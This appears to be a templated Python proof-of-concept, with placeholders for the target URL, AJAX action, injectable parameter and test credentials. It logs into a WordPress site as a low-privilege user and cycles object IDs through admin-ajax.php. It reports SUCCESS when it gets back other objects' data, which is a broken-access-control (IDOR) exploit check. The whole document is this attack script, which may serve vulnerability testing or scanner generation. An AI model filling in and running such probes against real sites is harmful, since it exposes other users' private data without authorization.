import requests
from wp_login import wp_login

TARGET = "{{ target_url }}"
ACTION = "{{ ajax_action }}"
PARAM = "{{ injectable_param }}"
USERNAME = "{{ test_username }}"
PASSWORD = "{{ test_password }}"

session = requests.Session()
login = wp_login(session, TARGET, USERNAME, PASSWORD)
if not login.success:
    print(f"[-] FAILURE: login failed for {USERNAME}: {login.reason}")
    raise SystemExit(0)

candidate_ids = ["1", "2", "3", "10", "100"]
hits = []
for object_id in candidate_ids:
    resp = session.post(
        f"{TARGET}/wp-admin/admin-ajax.php",
        data={"action": ACTION, PARAM: object_id, {{ extra_params }}},
        timeout=20,
    )
    body = resp.text[:500]
    if resp.status_code == 200 and not any(marker in body.lower() for marker in ("forbidden", "unauthorized", "not allowed", "-1")):
        hits.append((object_id, resp.status_code, body))

if hits:
    print(f"[+] SUCCESS: low-privilege user received object data via {ACTION}")
    for object_id, status, body in hits[:3]:
        print(f"    id={object_id} status={status} body={body[:250]}")
else:
    print(f"[-] FAILURE: no cross-object data returned by {ACTION}")
